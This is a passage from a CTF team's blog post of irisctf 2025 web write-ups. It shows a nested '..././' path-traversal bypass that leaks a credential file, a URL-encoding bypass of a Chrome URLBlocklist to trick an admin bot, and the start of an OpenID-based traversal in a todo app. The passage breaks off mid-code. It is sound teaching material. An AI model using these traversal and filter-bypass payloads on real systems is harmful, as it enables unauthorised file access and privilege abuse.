<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="irisctf 2025 Web Writeups" /><meta name="author" content="m0z" /><meta property="og:locale" content="en" /><meta name="description" content="We played irisctf as Ireland Without the RE and finished in 22nd position. This writeup will only include web challenges. We managed to full clear the web category so this will cover all of them." /><meta property="og:description" content="We played irisctf as Ireland Without the RE and finished in 22nd position. This writeup will only include web challenges. We managed to full clear the web category so this will cover all of them." /><link rel="canonical" href="https://ireland.re/posts/irisctf_2025/" /><meta property="og:url" content="https://ireland.re/posts/irisctf_2025/" /><meta property="og:site_name" content="Ireland.RE" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2025-01-05T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="irisctf 2025 Web Writeups" /><meta name="twitter:site" content="@LooseSecurity" /><meta name="twitter:creator" content="@m0z" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"m0z"},"dateModified":"2025-01-06T12:25:01+00:00","datePublished":"2025-01-05T00:00:00+00:00","description":"We played irisctf as Ireland Without the RE and finished in 22nd position. This writeup will only include web challenges. We managed to full clear the web category so this will cover all of them.","headline":"irisctf 2025 Web Writeups","mainEntityOfPage":{"@type":"WebPage","@id":"https://ireland.re/posts/irisctf_2025/"},"url":"https://ireland.re/posts/irisctf_2025/"}</script><title>irisctf 2025 Web Writeups | Ireland.RE</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Ireland.RE"><meta name="application-name" content="Ireland.RE"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /images/logo.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Ireland.RE</a></div><div class="site-subtitle font-italic">Ireland Without the RE</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/members/" class="nav-link"> <i class="fa-fw ml-xl-3 mr-xl-3 unloaded"></i> <span>MEMBERS</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/ECSCIreland" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/LooseSecurity" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['none','none.none'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>irisctf 2025 Web Writeups</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>irisctf 2025 Web Writeups</h1><div class="post-meta text-muted"><div> By <em> <a href="https://ctftime.org/team/179144">Ireland Without the RE</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1736035200" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2025-01-05 </em> </span> <span> Updated <em class="timeago" data-ts="1736166301" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2025-01-06 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2101 words"> <em>11 min</em> read</span></div></div></div><div class="post-content"><p>We played irisctf as Ireland Without the RE and finished in 22nd position. This writeup will only include web challenges. We managed to full clear the web category so this will cover all of them.</p><h1 id="webpassword-manager-357-solves">web/Password Manager (357 Solves)</h1><p>This was the “baby” Web challenge. I managed to get first blood on this with a time of <br /> 3 Minutes, 38 Seconds which I was pretty pleased about!</p><h2 id="analyzing-the-source"><span class="mr-2">Analyzing the Source</span><a href="#analyzing-the-source" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>The first thing I did when the CTF started was to download the challenge source. Opening it in my IDE I immediately noticed a reference to path traversal.</p><div class="language-go highlighter-rouge"><div class="code-header"> <span data-label-text="Go"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre><span class="k">func</span> <span class="n">pages</span><span class="p">(</span><span class="n">w</span> <span class="n">http</span><span class="o">.</span><span class="n">ResponseWriter</span><span class="p">,</span> <span class="n">r</span> <span class="o">*</span><span class="n">http</span><span class="o">.</span><span class="n">Request</span><span class="p">)</span> <span class="p">{</span>
	<span class="c">// You. Shall. Not. Path traverse!</span>
	<span class="n">path</span> <span class="o">:=</span> <span class="n">PathReplacer</span><span class="o">.</span><span class="n">Replace</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">URL</span><span class="o">.</span><span class="n">Path</span><span class="p">)</span>

	<span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="s">"/"</span> <span class="p">{</span>
		<span class="n">homepage</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="n">r</span><span class="p">)</span>
		<span class="k">return</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="s">"/login"</span> <span class="p">{</span>
		<span class="n">login</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="n">r</span><span class="p">)</span>
		<span class="k">return</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="s">"/getpasswords"</span> <span class="p">{</span>
		<span class="n">getpasswords</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="n">r</span><span class="p">)</span>
		<span class="k">return</span>
	<span class="p">}</span>

	<span class="n">fullPath</span> <span class="o">:=</span> <span class="s">"./pages"</span> <span class="o">+</span> <span class="n">path</span>

	<span class="k">if</span> <span class="n">_</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">Stat</span><span class="p">(</span><span class="n">fullPath</span><span class="p">);</span> <span class="n">os</span><span class="o">.</span><span class="n">IsNotExist</span><span class="p">(</span><span class="n">err</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">notfound</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="n">r</span><span class="p">)</span>
		<span class="k">return</span>
	<span class="p">}</span>

	<span class="n">http</span><span class="o">.</span><span class="n">ServeFile</span><span class="p">(</span><span class="n">w</span><span class="p">,</span> <span class="n">r</span><span class="p">,</span> <span class="n">fullPath</span><span class="p">)</span>
<span class="p">}</span>
</pre></table></code></div></div><p>I saw the concatenation with <code class="language-plaintext highlighter-rouge">fullPath</code> and the reference to <code class="language-plaintext highlighter-rouge">http.ServeFile</code> and realized that whatever path we passed would be literally served. Next, I noticed the <code class="language-plaintext highlighter-rouge">PathReplacer</code> and saw its source:</p><div class="language-go highlighter-rouge"><div class="code-header"> <span data-label-text="Go"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="k">var</span>  <span class="n">PathReplacer</span>  <span class="o">=</span>  <span class="n">strings</span><span class="o">.</span><span class="n">NewReplacer</span><span class="p">(</span>

<span class="s">"../"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span>

<span class="p">)</span>
</pre></table></code></div></div><p>So I figured this would only do a single replace of <code class="language-plaintext highlighter-rouge">../</code> and we could bypass by nesting this as <code class="language-plaintext highlighter-rouge">..././</code> and next we just needed to figure out where the flag was.</p><p>Well, the source file references a <code class="language-plaintext highlighter-rouge">users.json</code> where presumably credentials are stored. Sending a <code class="language-plaintext highlighter-rouge">GET /..././users.json</code> provides us with the following:</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
    </span><span class="nl">"skat"</span><span class="p">:</span><span class="w"> </span><span class="s2">"rf=easy-its+just&amp;spicysines123!@"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>When we login with this user/pass combo we can find the flag.</p><p><code class="language-plaintext highlighter-rouge">irisctf{l00k5_l1k3_w3_h4v3_70_t34ch_sk47_h0w_70_r3m3mb3r_s7uff}</code></p><h1 id="webpolitical-152-solves">web/Political (152 Solves)</h1><p>This next challenge was initially broken but was later fixed. It was a little bit painful and I burnt a lot of time trying to debug thinking there was something missing. We can create a token and it gets added to a dictionary and assigned the value <code class="language-plaintext highlighter-rouge">False</code> but if we can send a request to <code class="language-plaintext highlighter-rouge">/giveflag</code> with our token and the admin cookies then we can set it to true and retrieve it.</p><h2 id="analyzing-the-source-1"><span class="mr-2">Analyzing the Source</span><a href="#analyzing-the-source-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>So after generating a token <code class="language-plaintext highlighter-rouge">2123feca33c077329b773d226cbdf1b5</code> I checked the source to see how the admin bot could give me a cookie.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/giveflag"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">hello_world</span><span class="p">():</span>
    <span class="k">if</span> <span class="s">"token"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span> <span class="ow">or</span> <span class="s">"admin"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">request</span><span class="p">.</span><span class="n">cookies</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"Who are you?"</span>

    <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">[</span><span class="s">"token"</span><span class="p">]</span>
    <span class="n">admin</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">cookies</span><span class="p">[</span><span class="s">"admin"</span><span class="p">]</span>
    <span class="k">if</span> <span class="n">token</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">valid_tokens</span> <span class="ow">or</span> <span class="n">admin</span> <span class="o">!=</span> <span class="n">ADMIN</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"Why are you?"</span>

    <span class="n">valid_tokens</span><span class="p">[</span><span class="n">token</span><span class="p">]</span> <span class="o">=</span> <span class="bp">True</span>
    <span class="k">return</span> <span class="s">"GG"</span>
</pre></table></code></div></div><p>So, we need to get it to pass <code class="language-plaintext highlighter-rouge">token</code> as a request argument (GET parameter) and have the admin cookie (the bot already assigns this). Then we need to set the <code class="language-plaintext highlighter-rouge">token</code> value to our token (<code class="language-plaintext highlighter-rouge">2123feca33c077329b773d226cbdf1b5</code>) and it should work. That seems pretty simple. We can send it to <code class="language-plaintext highlighter-rouge">/giveflag?token=2123feca33c077329b773d226cbdf1b5</code> and we will be done?</p><h2 id="chrome-policies"><span class="mr-2">Chrome Policies</span><a href="#chrome-policies" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>I figured out that the reason this wasn’t working was due to a browser policy. It is stored in the <code class="language-plaintext highlighter-rouge">policies.json</code> file and added to the browser files during build time (see Dockerfile).</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
</span><span class="nl">"URLBlocklist"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"*/giveflag"</span><span class="p">,</span><span class="w"> </span><span class="s2">"*?token=*"</span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>From what I read about Chrome policies, these rules are globs. To interpret this; <code class="language-plaintext highlighter-rouge">*/giveflag</code> blocks a URL which contains <code class="language-plaintext highlighter-rouge">/giveflag</code> literally and anything preceding it. This is pretty simple, however <code class="language-plaintext highlighter-rouge">*?token=*</code> is deceiving. In this case the <code class="language-plaintext highlighter-rouge">?</code> means is globbed as a single character. This means that if you tried to bypass this filter by doing something like <code class="language-plaintext highlighter-rouge">?abc=xyz&amp;token=...</code> it wouldn’t work as it would still match this rule!</p><p>In the end, I realized that URL encoding worked for both cases. <code class="language-plaintext highlighter-rouge">https://political-web.chal.irisc.tf/%67iveflag?%74oken=2123feca33c077329b773d226cbdf1b5</code></p><p>Once I send the bot to this URL, I can return to submit my token and retrieve the flag.</p><p><code class="language-plaintext highlighter-rouge">irisctf{flag_blocked_by_admin}</code></p><h1 id="webbad-todo-75-solves">web/Bad Todo (75 Solves)</h1><p>This challenge really wasn’t all that hard. Most of the annoyance was setting up endpoints with the correct format on a webhook. The actual vulnerability was reasonably clear once you managed to authenticate.</p><h2 id="analyzing-the-source-2"><span class="mr-2">Analyzing the Source</span><a href="#analyzing-the-source-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>I firstly noticed this function <code class="language-plaintext highlighter-rouge">getStoragePath</code> in <code class="language-plaintext highlighter-rouge">storage.js</code> which was seemingly vulnerable to local file disclosure.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="k">export</span> <span class="kd">function</span> <span class="nx">getStoragePath</span><span class="p">(</span><span class="nx">idp</span><span class="p">,</span> <span class="nx">sub</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">first2</span> <span class="o">=</span> <span class="nx">sub</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
    <span class="kd">const</span> <span class="nx">rest</span> <span class="o">=</span> <span class="nx">sub</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>

    <span class="kd">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="s2">`</span><span class="p">${</span><span class="nx">sha256sum</span><span class="p">(</span><span class="nx">idp</span><span class="p">)}</span><span class="s2">/</span><span class="p">${</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">first2</span><span class="p">)}</span><span class="s2">/</span><span class="p">${</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">rest</span><span class="p">)}</span><span class="s2">`</span><span class="p">;</span>
    <span class="k">return</span> <span class="nx">sanitizePath</span><span class="p">(</span><span class="nx">path</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>If we could control either <code class="language-plaintext highlighter-rouge">idp</code> or <code class="language-plaintext highlighter-rouge">sub</code> then we could abuse this. Immediately reading this, it becomes clear that controlling <code class="language-plaintext highlighter-rouge">idp</code> isn’t all that useful since it is passed through <code class="language-plaintext highlighter-rouge">sha256sum</code> before it ever gets used. However, controlling <code class="language-plaintext highlighter-rouge">sub</code> would be sufficient. It cuts <code class="language-plaintext highlighter-rouge">sub</code> into two parts, namely <code class="language-plaintext highlighter-rouge">first2</code> and <code class="language-plaintext highlighter-rouge">rest</code> which should be fine for us. If we pass just <code class="language-plaintext highlighter-rouge">..flag</code> it will load the flag!</p><p>So now I wanted to work backwards and find a function which calls <code class="language-plaintext highlighter-rouge">getStoragePath</code> but allows us to control <code class="language-plaintext highlighter-rouge">sub</code> value. It must also use the return value in such a way that we can see it.</p><h2 id="finding-getusertodos"><span class="mr-2">Finding getUserTodos</span><a href="#finding-getusertodos" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Many of the functions call this but one which stood out to me was <code class="language-plaintext highlighter-rouge">getUserTodos</code> which gets called in <code class="language-plaintext highlighter-rouge">app.js</code> like so:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="dl">"</span><span class="s2">todos.ejs</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
    <span class="nx">name</span><span class="p">,</span>
    <span class="na">todos</span><span class="p">:</span> <span class="k">await</span> <span class="nx">getUserTodos</span><span class="p">(</span><span class="nx">userInfo</span><span class="p">.</span><span class="nx">idpUrl</span><span class="p">,</span> <span class="nx">userInfo</span><span class="p">.</span><span class="nx">userId</span><span class="p">)</span>
<span class="p">});</span>
</pre></table></code></div></div><p>This function will pass <code class="language-plaintext highlighter-rouge">userInfo.userId</code> into <code class="language-plaintext highlighter-rouge">getStoragePath</code> and return its value. This also renders the value whenever we view our todo list. Next, we only need to find a way to modify <code class="language-plaintext highlighter-rouge">userInfo.userId</code> to abuse it.</p><h2 id="dealing-with-authentication"><span class="mr-2">Dealing With Authentication</span><a href="#dealing-with-authentication" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Firstly, we need to get a session. To do so, we need to return JSON containing the following keys: <code class="language-plaintext highlighter-rouge">issuer</code>, <code class="language-plaintext highlighter-rouge">authorization_endpoint</code>, <code class="language-plaintext highlighter-rouge">token_endpoint</code> and <code class="language-plaintext highlighter-rouge">userinfo_endpoint</code>.</p><p>The <code class="language-plaintext highlighter-rouge">issuer</code> will be our <code class="language-plaintext highlighter-rouge">idpURL</code> that we can use by pointing it to our webhook. The <code class="language-plaintext highlighter-rouge">authorization_endpoint</code> should point to the challenge’s <code class="language-plaintext highlighter-rouge">auth_redirect</code> so it can automatically redirect us to the next stage. The <code class="language-plaintext highlighter-rouge">token_endpoint</code> can also point to our webhook. Finally, the <code class="language-plaintext highlighter-rouge">userinfo_endpoint</code> can also point to our webhook so we can control its values. Once we return that, we will get a session (from <code class="language-plaintext highlighter-rouge">/start</code> endpoint) and can proceed to <code class="language-plaintext highlighter-rouge">/auth_redirect</code> flow:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre><td class="rouge-code"><pre><span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/auth_redirect</span><span class="dl">"</span><span class="p">,</span> <span class="nx">asyncHandler</span><span class="p">(</span><span class="k">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">session</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="dl">"</span><span class="s2">No session</span><span class="dl">"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">session</span> <span class="o">!==</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">state</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="dl">"</span><span class="s2">Bad state</span><span class="dl">"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="dl">"</span><span class="s2">identity provider gave us an error.</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">}</span>
    
    <span class="kd">const</span> <span class="nx">sessionDetails</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">lookupSession</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">.</span><span class="nx">session</span><span class="p">);</span>
    <span class="kd">const</span> <span class="nx">response</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">safeJson</span><span class="p">(</span><span class="nx">sessionDetails</span><span class="p">.</span><span class="nx">idpUrl</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/.well-known/openid-configuration</span><span class="dl">"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">response</span><span class="p">.</span><span class="nx">token_endpoint</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="dl">"</span><span class="s2">No token endpoint</span><span class="dl">"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">response</span><span class="p">.</span><span class="nx">userinfo_endpoint</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="dl">"</span><span class="s2">No user info endpoint</span><span class="dl">"</span><span class="p">);</span>

    <span class="kd">const</span> <span class="nx">search</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">();</span>
    <span class="nx">search</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="dl">"</span><span class="s2">grant_type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">authorization_code</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">search</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="dl">"</span><span class="s2">code</span><span class="dl">"</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">code</span><span class="p">);</span>
    <span class="nx">search</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="dl">"</span><span class="s2">redirect_uri</span><span class="dl">"</span><span class="p">,</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">BASE</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">/auth_redirect</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">search</span><span class="p">.</span><span class="nx">append</span><span class="p">(</span><span class="dl">"</span><span class="s2">client_id</span><span class="dl">"</span><span class="p">,</span> <span class="nx">sessionDetails</span><span class="p">.</span><span class="nx">clientId</span><span class="p">);</span>
    
    <span class="kd">const</span> <span class="nx">tokenResponse</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">safeJson</span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">token_endpoint</span><span class="p">,</span> <span class="p">{</span>
        <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span>
        <span class="na">body</span><span class="p">:</span> <span class="nx">search</span><span class="p">.</span><span class="nx">toString</span><span class="p">(),</span>
        <span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
            <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span>
        <span class="p">}</span>
    <span class="p">});</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">tokenResponse</span> <span class="o">||</span> <span class="o">!</span><span class="nx">tokenResponse</span><span class="p">.</span><span class="nx">access_token</span> <span class="o">||</span> <span class="o">!</span><span class="nx">tokenResponse</span><span class="p">.</span><span class="nx">token_type</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="dl">"</span><span class="s2">Bad token response</span><span class="dl">"</span><span class="p">);</span>

    <span class="kd">const</span> <span class="nx">userInfo</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">safeJson</span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">userinfo_endpoint</span><span class="p">,</span> <span class="p">{</span>
        <span class="na">headers</span><span class="p">:</span> <span class="p">{</span>
            <span class="dl">"</span><span class="s2">Authorization</span><span class="dl">"</span><span class="p">:</span> <span class="s2">`</span><span class="p">${</span><span class="nx">tokenResponse</span><span class="p">.</span><span class="nx">token_type</span><span class="p">}</span><span class="s2"> </span><span class="p">${</span><span class="nx">tokenResponse</span><span class="p">.</span><span class="nx">access_token</span><span class="p">}</span><span class="s2">`</span>
        <span class="p">}</span>
    <span class="p">});</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">userInfo</span> <span class="o">||</span> <span class="o">!</span><span class="nx">userInfo</span><span class="p">.</span><span class="nx">sub</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="dl">"</span><span class="s2">user has no sub</span><span class="dl">"</span><span class="p">);</span>

